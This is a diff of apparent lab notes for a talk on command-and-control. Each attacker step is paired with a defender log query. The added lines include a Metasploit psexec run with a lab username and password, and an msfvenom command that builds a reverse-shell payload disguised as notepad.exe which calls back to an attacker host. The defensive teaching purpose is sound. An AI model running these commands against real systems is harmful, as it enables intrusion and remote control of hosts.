@@ -15,6 +15,15 @@ Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`
 
 **Attacker**
 
+```
+msfconsole
+msf6 > use exploit/windows/smb/psexec
+msf6 > set RHOSTS 192.168.37.237
+msf6 > set SMBUser fgaeta
+msf6 > set SMBPass W1nter2023!
+msf6 > exploit
+```
+
 <img width="540" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/33b73450-2f72-4154-adb8-e4df73605205">
 
 **Defender**
@@ -37,8 +46,32 @@ Windows Defender Antivirus killed the connection:
 
 <img width="558" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/8d7f5896-91be-41d1-9b31-ac312b38ddd4">
 
+## Attacker creates plan.exe with msfvenom:
 
-## afaef
+**Attacker**
+
+`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -x notepad.exe -f exe > plan.exe`
+
+Attacker uploads `plan.exe` via wmiexex.py's `lput`, tries to run it, and fails:
+
+<img width="495" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/4fd06aff-b3eb-4104-9fb8-20f0b9436408">
+
+**Defender**
+
+The command executed:
+
+`Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*Image: C:\Users\fgaeta\plan.exe*"} | fl`
+
+Then Windows Defender killed it:
+
+`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1116} | Where {$_.Message -like "*plan.exe*"} | fl | more`
+
+## Attacker uses xor encoding and re-uploads plan.exe
+
+
+
+
+
 
 **Long tail analysis**: `Get-WinEvent -Path C:\labs\valkyrie-security.evtx | Group-Object id -NoElement | sort count`
 
